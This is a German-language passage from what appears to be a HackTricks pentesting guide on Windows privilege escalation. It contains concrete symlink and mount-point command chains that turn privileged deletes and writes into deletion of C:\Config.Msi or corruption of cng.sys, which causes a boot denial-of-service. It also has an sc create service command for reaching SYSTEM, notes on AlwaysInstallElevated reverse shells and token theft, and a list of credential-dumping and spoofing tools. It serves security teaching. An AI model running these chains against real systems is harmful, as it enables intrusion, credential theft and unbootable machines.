- Option C: Erstelle einen **Symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dies zielt auf den internen NTFS-Stream ab, der die Ordner-Metadaten speichert — wenn man ihn löscht, wird der Ordner gelöscht.

5. Schritt 5: Den oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Aber jetzt löscht er aufgrund des junction + symlink tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von Arbitrary Folder Create zu Permanent DoS

Nutze eine Primitive aus, die es dir erlaubt, **einen beliebigen Ordner als SYSTEM/admin zu erstellen** — selbst wenn du **keine Dateien schreiben** oder **schwache Berechtigungen setzen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem `cng.sys` Kernel-Mode-Treiber.
- Wenn du ihn **vorab als Ordner erstellst**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Dann versucht Windows während des Bootvorgangs, `cng.sys` zu laden.
- Es erkennt den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **crasht oder stoppt den Bootvorgang**.
- Es gibt **kein Fallback** und **keine Wiederherstellung** ohne externe Eingriffe (z. B. Boot-Reparatur oder Disk-Zugriff).

### Von privilegierten Log/Backup-Pfaden + OM symlinks zu beliebigem Datei-Overwrite / Boot DoS

Wenn ein **privilegierter Dienst** Logs/Exporte in einen Pfad schreibt, der aus einer **schreibbaren config** gelesen wird, leite diesen Pfad mit **Object Manager symlinks + NTFS mount points** um, um den privilegierten Schreibvorgang in ein beliebiges Überschreiben zu verwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).

**Voraussetzungen**
- Die config, die den Zielpfad speichert, ist vom Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Die Fähigkeit, einen Mount Point zu `\RPC Control` und einen OM file symlink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Eine privilegierte Operation, die in diesen Pfad schreibt (Log, Export, Report).

**Beispielkette**
1. Lies die config aus, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Admin um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte darauf, dass die privilegierte Komponente das Log schreibt (z. B. löst der Admin „send test SMS“ aus). Der Schreibvorgang landet jetzt in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebenen Ziel (Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Das lässt sich auch auf jede geschützte Datei verallgemeinern, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise von `C:\Windows\System32\drivers\cng.sys` geladen, aber wenn eine Kopie in `C:\Windows\System32\cng.sys` existiert, kann sie zuerst versucht werden, was sie zu einem zuverlässigen DoS-Ziel für beschädigte Daten macht.



## **Von High Integrity zu System**

### **Neuer Dienst**

Wenn du bereits in einem High-Integrity-Prozess ausführst, kann der **Pfad zu SYSTEM** ganz einfach sein: einfach **einen neuen Dienst erstellen und ausführen**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Beim Erstellen einer Service-Binary stelle sicher, dass es ein gültiger Service ist oder dass die Binary die notwendigen Aktionen schnell genug ausführt, da sie nach 20s beendet wird, wenn sie kein gültiger Service ist.

### AlwaysInstallElevated

Von einem High Integrity-Prozess aus könntest du versuchen, die Registry-Einträge **AlwaysInstallElevated** zu **aktivieren** und eine Reverse Shell mit einem _**.msi**_-Wrapper zu **installieren**.\
[Mehr Informationen zu den beteiligten Registry-Keys und wie man ein _.msi_-Paket installiert, findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Du kannst** [**den Code hier finden**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du diese Token-Privilegien hast (wahrscheinlich findest du das bereits in einem High Integrity-Prozess), wirst du in der Lage sein, **fast jeden Prozess** zu **öffnen** (nicht geschützte Prozesse) mit dem SeDebug-Privileg, das Token des Prozesses zu **kopieren** und einen **beliebigen Prozess mit diesem Token zu erstellen**.\
Diese Technik wird normalerweise genutzt, um einen beliebigen Prozess auszuwählen, der als SYSTEM mit allen Token-Privilegien läuft (_ja, du kannst SYSTEM-Prozesse ohne alle Token-Privilegien finden_).\
**Du kannst ein** [**Beispiel für Code, der die vorgeschlagene Technik ausführt, hier finden**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter verwendet, um in `getsystem` zu eskalieren. Die Technik besteht darin, **eine Pipe zu erstellen und dann einen Service zu erstellen/missbrauchen, der auf diese Pipe schreibt**. Dann kann der **Server**, der die Pipe unter Verwendung des **`SeImpersonate`**-Privilegs erstellt hat, das **Token des Pipe-Clients** (des Services) **imitieren** und so SYSTEM-Privilegien erlangen.\
Wenn du mehr über name pipes erfahren möchtest, solltest du [**dies hier lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel dafür lesen möchtest, [**wie man mit name pipes von High Integrity zu System kommt, solltest du dies hier lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine dll zu **hijacken**, die von einem **Prozess** geladen wird, der als **SYSTEM** läuft, kannst du beliebigen Code mit diesen Rechten ausführen. Daher ist Dll Hijacking auch für diese Art der Privilege Escalation nützlich und außerdem aus einem High Integrity-Prozess heraus **deutlich leichter zu erreichen**, da dieser **Schreibrechte** auf die Ordner hat, die zum Laden von dlls verwendet werden.\
**Du kannst** [**hier mehr über Dll hijacking erfahren**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Bestes Tool, um nach Windows local privilege escalation vectors zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Prüft auf Fehlkonfigurationen und sensible Dateien (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Prüft auf einige mögliche Fehlkonfigurationen und sammelt Informationen (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Prüft auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Es extrahiert PuTTY-, WinSCP-, SuperPuTTY-, FileZilla- und RDP-Sitzungsinformationen. Verwende -Thorough lokal.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldedaten aus dem Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Verteilt gesammelte Passwörter im gesamten Domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS-Spoofer- und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende Windows-Enumeration für privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten privesc-Schwachstellen (VERALTET zugunsten von Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Checks **(Adminrechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**vorcompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriert das System und sucht nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als privesc) (muss kompiliert werden) **(**[**vorcompiliert**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldedaten aus vielen Programmen (vorcompilierte exe auf github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (ausführbare Datei vorcompiliert auf github). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (exe aus python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Basis dieses Posts erstellt wurde (es benötigt kein accesschk, um korrekt zu funktionieren, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der richtigen Version von .NET kompilieren ([siehe dies](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte Version von .NET auf dem Zielhost zu sehen, kannst du Folgendes tun:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)

{{#include ../../banners/hacktricks-training.md}}
